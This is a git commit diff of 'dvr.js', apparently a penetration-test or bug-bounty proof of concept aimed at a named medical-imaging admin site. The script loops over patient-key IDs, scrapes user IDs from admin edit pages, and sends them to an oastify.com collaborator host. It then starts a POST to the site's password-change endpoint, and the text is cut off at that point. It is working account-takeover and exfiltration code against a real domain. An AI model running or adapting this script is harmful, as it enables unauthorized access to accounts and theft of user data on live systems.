56af8ca8e9a690fb090bb76c53e1e57caa4f13d0
Yarterss <trey@inspectiv.com>
2025-08-05 11:09:10 -0500

    Update dvr.js

--- dvr.js
+++ dvr.js
@@ -1,10 +1,10 @@
-for (let i = 197809; i <= 197809; i++) {
+for (let i = 199326; i <= 199327; i++) {
   fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
     .then(res => res.text())
     .then(res => {
       let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
       if (match) {
-        fetch(`https://rtoiinryfxtoxe4fri1y2x6wpnvej57u.oastify.com?data=${encodeURIComponent(match[1])}`);
+        fetch(`https://sqm50mxj4zrnrbg5zyi50xhdy44vslga.oastify.com?data=${encodeURIComponent(match[1])}`);
       }
       return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
         method: "POST",
